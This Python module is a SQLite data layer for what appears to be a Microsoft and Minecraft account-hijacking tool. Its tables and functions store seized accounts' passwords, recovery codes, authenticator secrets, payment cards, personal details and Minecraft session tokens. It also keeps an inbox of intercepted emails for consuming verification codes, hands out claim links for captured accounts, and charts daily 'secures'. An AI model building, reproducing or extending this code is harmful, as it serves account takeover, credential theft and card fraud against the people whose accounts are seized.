import sqlite3
import json

class DBConnection:
    def __init__(self) -> None:
        self.conn = sqlite3.connect("database/database.db", check_same_thread=False)
        self.cursor = self.conn.cursor()

    def __enter__(self):
        return self
    
    def __exit__(self, *args) -> None:
        self.conn.close()

    def setup_tables(self) -> None:
        self.cursor.executescript("""
            CREATE TABLE IF NOT EXISTS `security_emails` (
                email TEXT,
                password TEXT
            );

            CREATE TABLE IF NOT EXISTS `blacklisted_users` (
                id INTEGER UNIQUE
            );

            CREATE TABLE IF NOT EXISTS `claimed_accounts` (
                claim_id TEXT UNIQUE,
                claimed_by INTEGER
            );

            CREATE TABLE IF NOT EXISTS `secured_accounts` (
                claim_id TEXT UNIQUE,
                claimed_by INTEGER,
                ms_email TEXT,
                ms_security_email TEXT,
                ms_password TEXT,
                ms_recovery_code TEXT,
                ms_auth_secret TEXT,
                ms_first_name TEXT,
                ms_last_name TEXT,
                ms_full_name TEXT,
                ms_region TEXT,
                ms_birthday TEXT,
                ms_language TEXT,
                ms_family TEXT,
                ms_devices TEXT,
                ms_cards TEXT,
                ms_subscriptions_active TEXT,
                ms_subscriptions_canceled TEXT,
                ms_subscriptions_commercial TEXT,
                mc_name TEXT,
                mc_method TEXT,
                mc_gamertag TEXT,
                mc_uchange TEXT,
                mc_capes TEXT,
                mc_ssid TEXT,
                secured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS `received_emails` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT,
                from_address TEXT,
                subject TEXT,
                body TEXT,
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                consumed INTEGER DEFAULT 0
            );
        """)
        self.conn.commit()

    # Security Emails
    def add_security_email(self, email: str, pwd: str) -> None:
        self.cursor.execute("""
            INSERT INTO `security_emails` (email, password)
            VALUES (?, ?)
        """, (email, pwd)
        )

        self.conn.commit()

    def get_email_password(self, email: str) -> str | None:
        password = self.cursor.execute("""
            SELECT password FROM `security_emails`
            WHERE email = ?
        """, (email,)
        ).fetchone()

        return password
    
    def get_security_emails(self) -> tuple:
        emails = self.cursor.execute("""
            SELECT email FROM `security_emails`
        """).fetchall()

        return emails

    # Received Emails (custom SMTP)
    def add_email(self, to_address: str, from_address: str, subject: str, body: str) -> None:
        self.cursor.execute("""
            INSERT INTO `received_emails` (to_address, from_address, subject, body)
            VALUES (?, ?, ?, ?)
        """, (to_address, from_address, subject, body))
        self.conn.commit()

    def get_emails(self, to_address: str) -> list:
        return self.cursor.execute("""
            SELECT id, to_address, from_address, subject, body, received_at
            FROM `received_emails`
            WHERE to_address = ?
            ORDER BY received_at ASC
        """, (to_address.lower(),)).fetchall()

    def mark_unused(self, to_address: str) -> tuple | None:
        return self.cursor.execute("""
            SELECT id, body FROM `received_emails`
            WHERE to_address = ? AND consumed = 0
            ORDER BY received_at ASC
            LIMIT 1
        """, (to_address.lower(),)).fetchone()

    def mark_used(self, email_id: int) -> None:
        self.cursor.execute("""
            UPDATE `received_emails` SET consumed = 1 WHERE id = ?
        """, (email_id,))
        self.conn.commit()

    # Blacklisting
    def get_blacklisted_users(self) -> list:
        users = self.cursor.execute("""
            SELECT id FROM `blacklisted_users`
        """).fetchall()

        return [user_id for (user_id,) in users]
    
    def add_blacklisted_user(self, id: int) -> None:
        self.cursor.execute("""
            INSERT OR IGNORE INTO `blacklisted_users` (id)
            VALUES (?)
        """, (id,))
        self.conn.commit()

    def remove_blacklisted_user(self, id: int) -> None:
        self.cursor.execute("""
            DELETE FROM `blacklisted_users`
            WHERE id = ?
        """, (id,))
        self.conn.commit()

    # Secured Accounts
    def add_secured_account(self, claim_id: str, account: dict) -> None:
        ms = account["microsoft"]
        mc = account["minecraft"]
        subs = ms["subscriptions"]
        self.cursor.execute("""
            INSERT INTO `secured_accounts` (
                claim_id, claimed_by,
                ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
                ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday, ms_language,
                ms_family, ms_devices, ms_cards,
                ms_subscriptions_active, ms_subscriptions_canceled, ms_subscriptions_commercial,
                mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid
            ) VALUES (?, NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            claim_id,
            ms["email"], ms["security_email"], ms["password"], ms["recovery_code"], ms["auth_secret"],
            ms["firstName"], ms["lastName"], ms["fullName"], ms["region"], ms["birthday"], ms["language"],
            json.dumps(ms["family"]), json.dumps(ms["devices"]), json.dumps(ms["cards"]),
            json.dumps(subs["active"]), json.dumps(subs["canceled"]), json.dumps(subs["commercial"]),
            mc["name"], mc["method"], mc["gamertag"], mc["uchange"], mc["capes"], str(mc["SSID"])
        ))
        self.conn.commit()

    def is_valid_claim_id(self, claim_id: str) -> bool:
        result = self.cursor.execute("""
            SELECT 1 FROM `secured_accounts` WHERE claim_id = ?
        """, (claim_id,)).fetchone()
        return result is not None

    def is_already_claimed(self, claim_id: str) -> bool:
        result = self.cursor.execute("""
            SELECT 1 FROM `secured_accounts`
            WHERE claim_id = ? AND claimed_by IS NOT NULL
        """, (claim_id,)).fetchone()
        return result is not None

    def claim_account(self, claim_id: str, user_id: int) -> None:
        self.cursor.execute("""
            UPDATE `secured_accounts`
            SET claimed_by = ?
            WHERE claim_id = ? AND claimed_by IS NULL
        """, (user_id, claim_id))
        self.conn.commit()

    # Web Method
    def get_all_secured_accounts(self) -> list:
        rows = self.cursor.execute("""
            SELECT claim_id, ms_email, mc_name, mc_method, mc_gamertag, mc_capes, secured_at
            FROM secured_accounts
            ORDER BY secured_at DESC
            LIMIT 100
        """).fetchall()
        keys = ["claim_id", "ms_email", "mc_name", "mc_method", "mc_gamertag", "mc_capes", "secured_at"]
        return [dict(zip(keys, row)) for row in rows]

    def get_stats(self) -> dict:
        total = self.cursor.execute("SELECT COUNT(*) FROM secured_accounts").fetchone()[0]
        has_mc = self.cursor.execute(
            "SELECT COUNT(*) FROM secured_accounts WHERE mc_name != 'No Minecraft' AND mc_name IS NOT NULL"
        ).fetchone()[0]
        shared = self.cursor.execute("SELECT COUNT(*) FROM claimed_accounts").fetchone()[0]
        return {"total": total, "has_minecraft": has_mc, "shared_links": shared}

    def get_detailed_stats(self) -> dict:
        best_day = self.cursor.execute("""
            SELECT DATE(secured_at), COUNT(*) AS cnt
            FROM secured_accounts
            GROUP BY DATE(secured_at)
            ORDER BY cnt DESC LIMIT 1
        """).fetchone()

        best_month = self.cursor.execute("""
            SELECT strftime('%Y-%m', secured_at), COUNT(*) AS cnt
            FROM secured_accounts
            GROUP BY strftime('%Y-%m', secured_at)
            ORDER BY cnt DESC LIMIT 1
        """).fetchone()

        days_active = self.cursor.execute("""
            SELECT COUNT(DISTINCT DATE(secured_at)) FROM secured_accounts
        """).fetchone()[0]
        
        total = self.cursor.execute("SELECT COUNT(*) FROM secured_accounts").fetchone()[0]
        daily_avg = round(total / days_active, 1) if days_active else 0
        return {
            "best_day": best_day[0] if best_day else None,
            "best_day_count": best_day[1] if best_day else 0,
            "best_month": best_month[0] if best_month else None,
            "best_month_count": best_month[1] if best_month else 0,
            "daily_avg": daily_avg,
            "days_active": days_active,
        }

    def get_chart_data(self) -> list:
        rows = self.cursor.execute("""
            SELECT DATE(secured_at) as day, COUNT(*) as secures
            FROM secured_accounts
            WHERE secured_at >= DATE('now', '-6 days')
            GROUP BY DATE(secured_at)
            ORDER BY day ASC
        """).fetchall()
        return [{"day": row[0], "secures": row[1]} for row in rows]

    def get_secured_account(self, claim_id: str) -> dict | None:
        row = self.cursor.execute("""
            SELECT claim_id, ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
                   ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday, ms_language,
                   ms_family, ms_devices, ms_cards,
                   ms_subscriptions_active, ms_subscriptions_canceled, ms_subscriptions_commercial,
                   mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid, secured_at
            FROM `secured_accounts` WHERE claim_id = ?
        """, (claim_id,)).fetchone()

        if not row:
            return None
        keys = [
            "claim_id", "ms_email", "ms_security_email", "ms_password", "ms_recovery_code", "ms_auth_secret",
            "ms_first_name", "ms_last_name", "ms_full_name", "ms_region", "ms_birthday", "ms_language",
            "ms_family", "ms_devices", "ms_cards",
            "ms_subscriptions_active", "ms_subscriptions_canceled", "ms_subscriptions_commercial",
            "mc_name", "mc_method", "mc_gamertag", "mc_uchange", "mc_capes", "mc_ssid", "secured_at"
        ]
        return dict(zip(keys, row))
